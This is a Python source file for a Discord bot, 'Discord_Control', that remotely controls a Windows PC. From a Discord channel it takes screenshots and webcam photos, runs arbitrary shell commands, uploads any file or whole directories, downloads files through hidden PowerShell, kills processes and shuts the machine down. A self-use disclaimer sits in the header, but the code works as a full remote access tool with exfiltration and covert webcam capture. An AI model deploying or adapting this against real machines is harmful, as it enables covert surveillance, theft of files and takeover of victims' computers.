












##################################################
## This Programm lets you control your PC over
## Discord.
##################################################
## You can use this This Programm for yourself
## only! Dont try installing this on another
## Computer without there knowledge.
##################################################
## Author: https://github.com/DanielAckermann69
## Copyright: Copyright 2023, Control-Your-PC
## Version: 1.0.0
## Email: danielackermann.control.your.pc@gmail.com
###################################################

















import sys, time, os, requests, psutil, datetime, socket
from subprocess import Popen, STARTUPINFO, STARTF_USESHOWWINDOW
from time import sleep
from pyautogui import position
from cv2 import VideoCapture, imwrite
from discord import Embed, File, Color
from socket import create_connection
from PIL.ImageGrab import grab
from pathlib import Path
from discord.ext.commands import Bot

################# SETTINGS ##################
settings = {
    "settings": {
        "name": "Discord_Control",  # Change if you want
        "img": "https://m.media-amazon.com/images/I/41mhRSelGfL.png",
        "prefix": "!PC ",   # Change the prefix to what you want. By default its !PC with a space after it! commands would be "!PC commands"
        "internet-connection": False,
        "startmessage": {'main': '', 'zusatz': ''},
        "start-channel": "YOUR CHANNEL ID",     # fill in your channel id
        "askpermisson": {"message": "","use": ""},
        "descriptionmessage": "",
        "token": "YOUR BOT TOKEN"   # fill in your Bot Token. Dont know how to get it? --> WATCH A TUTORIAL THEN!!!
    },
    "paths": {
        "username": os.getlogin(),
        "userpath": Path.home(),
        "mainpath": Path(str(Path.home()) + '/Documents/Discord_Control'),
    }
}   # Change Your settings in here! <--

while not settings['settings']['internet-connection']:
    try:
        create_connection(("www.google.com", 80))
        print('connection is available')
        settings['settings']['internet-connection'] = True
    except:
        print('No connection\nWaiting 2sec...')
        sleep(2)

if not settings["paths"]["mainpath"].is_dir():
    os.mkdir(settings["paths"]["mainpath"])
client = Bot(command_prefix=settings["settings"]["prefix"])
si = STARTUPINFO()
si.dwFlags |= STARTF_USESHOWWINDOW
#############################################


def screeni():
    x, y = position()
    sleep(2)
    cam = VideoCapture(0)
    img = grab(all_screens=True)
    _, photo = cam.read()

    try:
        pixels = img.load()
        for i in range(10):
            pixels[x-i, y] = (255, 0, 0)
            pixels[x+i, y] = (255, 0, 0)
            pixels[x, y-i] = (255, 0, 0)
            pixels[x, y+i] = (255, 0, 0)
    except:
        pass
    img.save(Path(f'{str(settings["paths"]["mainpath"])}/screen.png'))
    imwrite(f'{str(settings["paths"]["mainpath"])}/image.png', photo)



@client.event
async def on_ready():
    settings['settings']['start-channel'] = client.get_channel(int(settings['settings']['start-channel']))
    settings['settings']['descriptionmessage'] = 'CWD: ' + os.getcwd()
    smembed = Embed(
        title=f'{str(settings["settings"]["name"])}',
        description=settings['settings']['descriptionmessage'] + settings['settings']['startmessage']['zusatz'],
        colour=Color.green()
    )
    smembed.set_thumbnail(
        url=settings['settings']['img'])
    smembed.set_author(name=f'danielackermann69')
    smembed.set_footer(text=f"https://link.gallery/danielackermann")
    settings['settings']['startmessage']['main'] = await settings['settings']['start-channel'].send(embed=smembed)
    await settings['settings']['startmessage']['main'].add_reaction('💻')
    await settings['settings']['startmessage']['main'].add_reaction('📴')
    await settings['settings']['startmessage']['main'].add_reaction('🔄')
    await settings['settings']['startmessage']['main'].add_reaction('🛏')
    await settings['settings']['startmessage']['main'].add_reaction('☢')


@client.event
async def on_reaction_add(reaction, user):
    if reaction.message == settings['settings']['startmessage']['main']:
        if user != client.user:
            if str(reaction.emoji) == '💻':
                await settings['settings']['startmessage']['main'].remove_reaction("💻", user)
                screeni()
                await settings['settings']['start-channel'].send(file=File(f'{settings["paths"]["mainpath"]}/screen.png'))
                await settings['settings']['start-channel'].send(file=File(f'{settings["paths"]["mainpath"]}/image.png'))
            if str(reaction.emoji) == '📴':
                await settings['settings']['startmessage']['main'].remove_reaction("📴", user)
                Popen('shutdown -s -t 0', startupinfo=si)
                await settings['settings']['start-channel'].send('Wird Heruntergefahren')
            if str(reaction.emoji) == '🛏':
                await settings['settings']['startmessage']['main'].remove_reaction("🛏", user)
                await settings['settings']['start-channel'].send('deepsleep!')
                Popen('rundll32.exe powrprof.dll,SetSuspendState', startupinfo=si) ## this is a weard command, i know. but what it does is saving the ram and everything to the harddrive or ssd. and actually shuts the pc down. on next start it will start all the last things.
            if str(reaction.emoji) == '🔄':
                await settings['settings']['startmessage']['main'].remove_reaction("🔄", user)
                Popen('shutdown -r -t 0', startupinfo=si)
                await settings['settings']['start-channel'].send('Wird neugestartet')
            if str(reaction.emoji) == "☢":
                await settings['settings']['startmessage']['main'].remove_reaction("☢", user)
                terminateembed = Embed(
                    title='Terminate?',
                    description=f'Are You sure you want to Terminate the Programm {settings["settings"]["name"]}',
                    colour=Color.red()
                )
                terminateembed.set_footer(text=f"Trouble with terminateing? use {settings['settings']['prefix']}terminate /force")
                settings['settings']['askpermisson']['message'] = await settings['settings']['start-channel'].send(embed=terminateembed)
                settings['settings']['askpermisson']['use'] = "terminate"
                await settings['settings']['askpermisson']['message'].add_reaction('✅')
                await settings['settings']['askpermisson']['message'].add_reaction('❌')


    elif reaction.message == settings['settings']['askpermisson']['message']:
        if user != client.user:
            if str(reaction.emoji) == '✅':
                await settings['settings']['askpermisson']['message'].delete()
                if settings['settings']['askpermisson']['use'] == "terminate":
                    await settings['settings']['start-channel'].send(f"Terminateing...")
                    sys.exit()
                elif settings['settings']['askpermisson']['use'] == "systemdir":
                    await splitsend(os.listdir(), data_already_split=True)
                settings['settings']['askpermisson']['message'] = None
                settings['settings']['askpermisson']['use'] = None
            if str(reaction.emoji) == '❌':
                await settings['settings']['askpermisson']['message'].delete()
                settings['settings']['askpermisson']['message'] = None
                settings['settings']['askpermisson']['use'] = None


async def splitsend(data, title="Data",embeded=True, data_already_split=False,splitsize = 50,maxcycles = 5):
    if not data_already_split:
        data_lines = data.split('\n')
    else:
        data_lines = data
    total_lines = len(data_lines)
    last_index = 0
    cycles = 0

    tomuchembed = Embed(
        title=f'WARNING!',
        description=f"You are over {maxcycles} cycles now! if u still want to see everything type the same command with /nolimit",
        colour=Color.from_rgb(255, 255, 0)
    )

    while last_index < total_lines:
        next_index = min(last_index + splitsize, total_lines)
        task_lines = data_lines[last_index:next_index]
        task_data = '\n'.join(task_lines)
        task_embed = Embed(
            title=f'{title}({last_index+1} - {next_index})',
            description=task_data,
            colour=Color.from_rgb(255, 125, 0)
        )
        if embeded:
            await settings['settings']['start-channel'].send(embed=task_embed)
        else:
            await settings['settings']['start-channel'].send(task_data)
        last_index = next_index
        cycles += 1
        if cycles >= maxcycles and maxcycles >=0:
            last_index = total_lines + 1
            await settings['settings']['start-channel'].send(embed=tomuchembed)


@client.command(description = "Takes screenshot",help=f"""
This command sends you a screen shot and a webcam picture by default.
You can only get a screenshot by typing:
{settings['settings']['prefix']}screenshot 1 0

You can only get a webcam picture by typing:
{settings['settings']['prefix']}screenshot 0 1""")
async def screenshot(ctx, screen=True, webcam=True):
    await settings['settings']['start-channel'].send("processing command")
    try:
        if ctx.channel == settings['settings']['start-channel']:
            if screen:
                screeni()
                await settings['settings']['start-channel'].send(file=File(f'{settings["paths"]["mainpath"]}/screen.png'))
            if webcam:
                await settings['settings']['start-channel'].send(file=File(f'{settings["paths"]["mainpath"]}/image.png'))
    except:
        await settings['settings']['start-channel'].send("cant send screenshots.")


@client.command(description = "Status",help=f"""
This command gives you information about your PC.
You will get:
current time, cwd, uptime, cpu usage, availiable memory, network and disk usage, and so on...""")
async def status(ctx):
    if ctx.channel == settings['settings']['start-channel']:
        try:
            current_time = datetime.datetime.now()
            uptime = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            cpu_usage = psutil.cpu_percent()
            mem = psutil.virtual_memory().available / (1024 ** 3)
            net_io_counters = psutil.net_io_counters()
            disk_usage = psutil.disk_usage('/')
            num_processes = len(psutil.pids())
            battery = psutil.sensors_battery()
            ip_address = socket.gethostbyname(socket.gethostname())
            public_ip = requests.get('https://api.ipify.org').text
            statusmessage = f"PC {os.getlogin()} is up and running!\nCurrent time: {current_time}\nCurrent working directory: {os.getcwd()}\nPC is running since: {uptime}\nCPU usage: {cpu_usage}%\nAvailable memory: {mem:.2f} GB\nNetwork usage: bytes sent={net_io_counters.bytes_sent}, bytes received={net_io_counters.bytes_recv}\nDisk usage: total={disk_usage.total / (1024 ** 3):.2f} GB, used={disk_usage.used / (1024 ** 3):.2f} GB, free={disk_usage.free / (1024 ** 3):.2f} GB\nNumber of running processes: {num_processes}\n"

            if battery != None:
                statusmessage += f"Battery: {battery.percent}% remaining\n"

            statusmessage += f"IP address: {ip_address}\n"
            statusmessage += f"Public IP address: {str(public_ip)}\n"
        except Exception as e:
            statusmessage = "Error: "+str(e)

        statusembed = Embed(
            title='Status:',
            description=statusmessage,
            colour=Color.blue()
        )

        await settings['settings']['start-channel'].send(embed=statusembed)


@client.command(description = "Shows this message",help=f"""
This command gives you all commands.
Example:
{settings['settings']['prefix']}commands
lists all commands

You can also get details about other commands by typing:
{settings['settings']['prefix']}commands <command>
Example:
{settings['settings']['prefix']}commands get
This will give you detailed informations about the command 'get'""")
async def commands(ctx,cmd = None):
    if ctx.channel == settings['settings']['start-channel']:
        if cmd == None:
            helptext = "```"
            for command in client.commands:
                if not command.name == 'help':
                    helptext += f"{command} --> {command.description}\n"
            helptext += f"""
            
---------------------------------------------------------------     
       
You can also get details about other commands by typing:
{settings['settings']['prefix']}commands <command>
Example:
{settings['settings']['prefix']}commands get
This will give you detailed informations about the command 'get'```"""
            await settings['settings']['start-channel'].send(helptext)
        else:
            try:
                for command in client.commands:
                    if str(command.name).lower() == str(cmd).lower():
                        helpembed = Embed(
                            title=command.name,
                            description=f'{command.help}',
                            colour=Color.from_rgb(200, 200, 0)
                        )
                        await settings['settings']['start-channel'].send(embed=helpembed)
            except Exception as e:
                print(e)


@client.command(description = "clears the discord chat",help=f"""
This command clears the discord chat, by default this will remove 1000 messages
You can change this by simply typing a number after {settings['settings']['prefix']}clear.
Example:
{settings['settings']['prefix']}clear
This will delete the last 1000 messages

{settings['settings']['prefix']}clear 10
This will delete the last 10 messages""")
async def clear(ctx,limit=1000):
    if ctx.channel == settings['settings']['start-channel']:
        await settings['settings']['start-channel'].purge(limit=int(limit))


@client.command(description = f"terminates {settings['settings']['name']}",help=f"""
This command stops the programm from running.
By default this command will prompt you again for permission to kill this process.

BUT:
With the parameter /force you can instantly stop the programm
Example:
{settings['settings']['prefix']}terminate /force
This will stop the programm with the default error code 0""")
async def terminate(ctx):
    if ctx.channel == settings['settings']['start-channel']:
        if ctx.message.content.lower().__contains__("/force"):
            await settings['settings']['start-channel'].send(f"Terminate {settings['settings']['name']}")
            sys.exit()
        else:
            terminateembed = Embed(
                title='Terminate?',
                description=f'Are You sure you want to Terminate the Programm from {os.getlogin().upper()}',
                colour=Color.red()
            )
            terminateembed.set_footer(text="Trouble with terminateing? use /force")
            settings['settings']['askpermisson']['message'] = await settings['settings']['start-channel'].send(embed=terminateembed)
            settings['settings']['askpermisson']['use'] = "terminate"
            await settings['settings']['askpermisson']['message'].add_reaction('✅')
            await settings['settings']['askpermisson']['message'].add_reaction('❌')


@client.command(description = "change dir to <path>",help=f"""
This command will change the cwd to the given absolute or relative path.
Example:
{settings['settings']['prefix']}cd test/directory
{settings['settings']['prefix']}cd C:/Users/<user>/Desktop/test/directory

INFO:
<user> will be replaced with the currently logged on username
<userpath> will be replaced with the currently logged on userpath
""")
async def cd(ctx,*,newdir):
    if ctx.channel == settings['settings']['start-channel']:
        try:
            newdir = newdir.replace("<user>", str(settings['paths']['username']))
            newdir = newdir.replace("<userpath>", str(settings['paths']['userpath']))
        except Exception as e:
            print(e)
        os.chdir(str(newdir))
        await settings['settings']['start-channel'].send('CWD: '+os.getcwd())


@client.command(description = "lists dir",help=f"""
This command gives you a list of directorys and files in the cwd.
By default this command will send you a max of 5 cycles. write /nolimit after the command to
get the whole list.
Example:
{settings['settings']['prefix']}dir /nolimit

If the cwd is in system32 (which can happen if the programm start automaticaly on startup)
then the Programm will ask you if you really want to run this, since there are a lot of 
files in system32. and running this can take a while.
react with ✅ to exectue the command anyway""")
async def dir(ctx):
    if ctx.channel == settings['settings']['start-channel']:
        if ctx.message.content.lower().__contains__("/nolimit"):
            await splitsend(os.listdir(), data_already_split=True, title="Dir",maxcycles=-1)
        elif os.getcwd().lower().__contains__("system32"):
            systemdirembed = Embed(
                title='System32',
                description='You are in System32. Are you sure you want to run dir?',
                colour=Color.red()
            )
            settings['settings']['askpermisson']['message'] = await settings['settings']['start-channel'].send(embed=systemdirembed)
            settings['settings']['askpermisson']['use'] = "systemdir"
            await settings['settings']['askpermisson']['message'].add_reaction('✅')
            await settings['settings']['askpermisson']['message'].add_reaction('❌')
        else:
            await splitsend(os.listdir(),data_already_split=True,title="Dir")


@client.command(description = "prints current working dir",help=f"""
{settings['settings']['prefix']}cwd""")
async def cwd(ctx):
    if ctx.channel == settings['settings']['start-channel']:
        await settings['settings']['start-channel'].send(os.getcwd())


@client.command(description = "Executes the command <cmd>",help=f"""
This command Executes the command given after {settings['settings']['prefix']}exec
Example:
{settings['settings']['prefix']}exec shutdown -s -t 600
Sending this command will shutdown your Pc in 10 min.

Note:
If you dont want to write your username, you can write <user>.
Example:
{settings['settings']['prefix']}exec Del C:/Users/<user>/Desktop/test.txt
Sending this command will delete the file test.txt on your desktop.

However, you can replace \'C:/Users/<user>\' with \'<userpath>\'
Example:
{settings['settings']['prefix']}exec Del <userpath>/Desktop/test.txt
Sending this command will also delete the file test.txt on your desktop.
""")
async def exec(ctx,*,cmd):
    if ctx.channel == settings['settings']['start-channel']:
        cmd = cmd.replace("<user>",settings['paths']['username'])
        cmd = cmd.replace("<userpath>", settings['paths']['userpath'])
        cmd = cmd.replace("/nolimits", "")
        if ctx.message.content.lower().__contains__("/nolimit"):
            await splitsend(os.popen(cmd).read() + " ", data_already_split=False, title="Command: " + cmd,maxcycles=-1)
        else:
            await splitsend(os.popen(cmd).read()+" ",data_already_split=False,title="Command: "+cmd)


@client.command(description = "Downloads a file from your pc <file/file_path>", help=f"""
This command uploads the file given after the command name onto discord.
Example: {settings['settings']['prefix']}get myfile.txt.
\tThis command will upload the myfile.txt in the current working directory to discord.
\tYou can get the Current wroking directory by typing {settings['settings']['prefix']}cwd
You can also give the command a absolute path, like that:
{settings['settings']['prefix']}get {settings['paths']['userpath']}\\Documents\\myfile.txt""")
async def get(ctx,*,file):
    if ctx.channel == settings['settings']['start-channel']:
        file = file.replace("<user>", os.getlogin())
        if(Path(f'{file}').is_file()):
            await settings['settings']['start-channel'].send(file=File(file))
        elif(Path(f'{os.getcwd()}\\{file}').is_file()):
            await settings['settings']['start-channel'].send(file=File(f'{os.getcwd()}\\{file}'))
        else:
            await settings['settings']['start-channel'].send("File not found")


@client.command(description = "Downloads all files in cwd from your pc",help=f"""
This command uploads all files from the current working directory onto discord.
Example: {settings['settings']['prefix']}getAll

Sending this command will go through all files in the cwd and tries to send the file.
Note that if the file is to large the bot cant send it. (you will get an error message)""")
async def getAll(ctx):
    if ctx.channel == settings['settings']['start-channel']:
        files = [f for f in os.listdir('.') if os.path.isfile(f)]
        if not files:
            await settings['settings']['start-channel'].send("No files found in current directory.")
            return
        for file in files:
            try:
                await settings['settings']['start-channel'].send(file=File(file))
            except Exception as e:
                await settings['settings']['start-channel'].send(f"Error downloading {file}: {e}")


@client.command(description = "Downloads a file the internet and saves it on your pc (cwd)",help=f"""
This command takes a link that you have to write after {settings['settings']['prefix']}download
Example:
\t{settings['settings']['prefix']}download https://cdn.discordapp.com/attachments/1099053199790444594/1099053261534797884/duck.wav
\t\tThis would download a 1 sec duck sound. however, the outfile name would be zfilez.outfile
\t\tTo set the outfile to something you want, use the /name parameter.
\t\tLike this:
\t\t\t{settings['settings']['prefix']}download https://cdn.discordapp.com/attachments/1099053199790444594/1099053261534797884/duck.wav /name duck.wav

NOTE:
\tYou cant give an absolute path, since the code always tries to change the outfile name to the cwd + the name you gave!""")
async def download(ctx,*,link):
    if ctx.channel == settings['settings']['start-channel']:
        if link.__contains__("/name"):
            inputarr = link.split("/name")
            link = inputarr[0].strip()
            filename = inputarr[1].strip()
        else:
            filename = "zfilez.outfile"
        outfile = os.getcwd()+f"\\{filename}"
        Popen(f'powershell Invoke-WebRequest -Uri "{link}" -OutFile "{outfile}"',startupinfo=si)
        await settings['settings']['start-channel'].send(f"The File is downloading. Rename the file manually if needed! filename: \"{outfile}\"")


@client.command(description = "shuts down the pc",help=f"""
This will shutdown your PC""")
async def shutdown(ctx):
    if ctx.channel == settings['settings']['start-channel']:
        await settings['settings']['start-channel'].send('Shuting down...')
        Popen('shutdown -s -t ' + str(0), startupinfo=si)


@client.command(description = "restarts the pc",help=f"""
This will restart your PC""")
async def restart(ctx):
    if ctx.channel == settings['settings']['start-channel']:
        await settings['settings']['start-channel'].send('Restarting...')
        Popen('shutdown -r -t ' + str(0), startupinfo=si)


@client.command(description = "Set Pc in deepsleep",help=f"""
This will set Your PC in deep sleep mode""")
async def deepsleep(ctx):
    if ctx.channel == settings['settings']['start-channel']:
        await settings['settings']['start-channel'].send('Sleeping...')
        Popen('rundll32.exe powrprof.dll,SetSuspendState', startupinfo=si)


@client.command(description = "kills a task <task>",help=f"""
This will try to kill the Task given after 
{settings['settings']['prefix']}taskkill

Example:
{settings['settings']['prefix']}taskkill Chrome.exe
This will kill the task Chrome.exe""")
async def taskkill(ctx,*,task):
    if ctx.channel == settings['settings']['start-channel']:
        task = task.replace("<user>", os.getlogin())
        Popen(f'taskkill -im {task} -f',startupinfo=si)
        await settings['settings']['start-channel'].send("trying to kill the task: "+ task)


@client.command(description = "Saves attached file to CWD",help=f"""
This command will save the file attached to this command on your PC.
Example:
(attachedfile: test.txt) | {settings['settings']['prefix']}saveFile
This will save the attached file to the cwd. (you get the cwd by typing {settings['settings']['prefix']}cwd""")
async def saveFile(ctx):
    if ctx.channel == settings['settings']['start-channel']:
        try:
            attachment = ctx.message.attachments[0]
            await attachment.save(os.getcwd() + "/" + attachment.filename)
            await settings['settings']['start-channel'].send("File saved!")
        except Exception as e:
            await settings['settings']['start-channel'].send(f"Error while saving File {attachment.filename}: {e}")


@client.command(description = "lists all tasks",help=f"""
This command will give you a list with all running tasks.
{settings['settings']['prefix']}tasks""")
async def tasks(ctx):
    if ctx.channel == settings['settings']['start-channel']:
        os.popen(f'tasklist>\"{str(settings["paths"]["mainpath"])}/Tasks.txt\"')
        time.sleep(1.5)
        with open(f'{str(settings["paths"]["mainpath"])}/Tasks.txt','r') as tasklist:
            data = tasklist.read()
            tasks = set([line.split(' ')[0] for line in data.split('\n')])
            tasks = list(tasks)
            if ctx.message.content.lower().__contains__("/nolimit"):
                await splitsend(tasks, embeded=True, data_already_split=True,title="Tasks",maxcycles=-1)
            else:
                await splitsend(tasks, embeded=True, data_already_split=True,title="Tasks")
            tasklist.close()

if __name__ == '__main__':
    client.run(settings['settings']['token'])


